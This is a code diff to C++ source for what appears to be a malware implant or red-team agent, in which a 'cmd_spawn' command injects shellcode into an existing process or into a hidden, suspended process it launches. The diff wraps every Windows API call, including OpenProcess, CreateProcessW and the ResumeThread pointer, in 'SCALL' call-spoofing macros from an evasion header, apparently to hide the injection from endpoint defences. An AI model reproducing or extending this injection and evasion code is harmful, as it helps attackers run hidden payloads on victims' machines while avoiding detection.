@@ -10,6 +10,7 @@
 using namespace stardust;
 using namespace starburst;
 
+#include <evasion/spoof_dispatch.h>
 #include <evasion/injection_techniques.h>
 
 auto declfn starburst::cmd_spawn(
@@ -33,7 +34,7 @@ auto declfn starburst::cmd_spawn(
 
     if ( pid != 0 ) {
         // inject into existing PID
-        h_proc = inst.kernel32.OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );
+        h_proc = (HANDLE)SCALL( inst, kernel32.OpenProcess, PROCESS_ALL_ACCESS, FALSE, pid );
         if ( !h_proc ) {
             char msg[80] = { 0 };
             str_copy( msg, symbol<char*>( const_cast<char*>( "OpenProcess failed for PID " ) ) );
@@ -73,7 +74,7 @@ auto declfn starburst::cmd_spawn(
         si.wShowWindow       = 0;     // SW_HIDE
 
         PROCESS_INFORMATION pi = {};
-        BOOL ok = inst.kernel32.CreateProcessW(
+        BOOL ok = (BOOL)SCALL( inst, kernel32.CreateProcessW,
             nullptr, cmdline_w, nullptr, nullptr, FALSE,
             0x04 | 0x08000000,  // CREATE_SUSPENDED | CREATE_NO_WINDOW
             nullptr, nullptr, &si, &pi );
@@ -92,9 +93,9 @@ auto declfn starburst::cmd_spawn(
         h_thread = inject_shellcode( inst, h_proc, sc_data, sc_len );
 
         if ( !h_thread ) {
-            inst.kernel32.TerminateProcess( pi.hProcess, 1 );
-            inst.kernel32.CloseHandle( pi.hThread );
-            inst.kernel32.CloseHandle( pi.hProcess );
+            SCALL( inst, kernel32.TerminateProcess, pi.hProcess, 1 );
+            SCALL( inst, kernel32.CloseHandle, pi.hThread );
+            SCALL( inst, kernel32.CloseHandle, pi.hProcess );
             queue_response( inst, task_uuid, RESPONSE_ERROR,
                 symbol<char*>( const_cast<char*>( "injection into spawned process failed" ) ) );
             return;
@@ -107,21 +108,21 @@ auto declfn starburst::cmd_spawn(
                 reinterpret_cast<uintptr_t>( (HMODULE)inst.kernel32.handle ),
                 expr::hash_string( "ResumeThread" ) ) );
         if ( pResumeThread ) {
-            pResumeThread( pi.hThread );
+            SCALL_PTR( inst, pResumeThread, pi.hThread );
         }
 
-        inst.kernel32.CloseHandle( pi.hThread );
+        SCALL( inst, kernel32.CloseHandle, pi.hThread );
     }
 
     if ( !h_thread ) {
-        inst.kernel32.CloseHandle( h_proc );
+        SCALL( inst, kernel32.CloseHandle, h_proc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "injection failed" ) ) );
         return;
     }
 
-    inst.kernel32.CloseHandle( h_thread );
-    inst.kernel32.CloseHandle( h_proc );
+    SCALL( inst, kernel32.CloseHandle, h_thread );
+    SCALL( inst, kernel32.CloseHandle, h_proc );
 
     char msg[120] = { 0 };
     str_copy( msg, symbol<char*>( const_cast<char*>( "injected " ) ) );
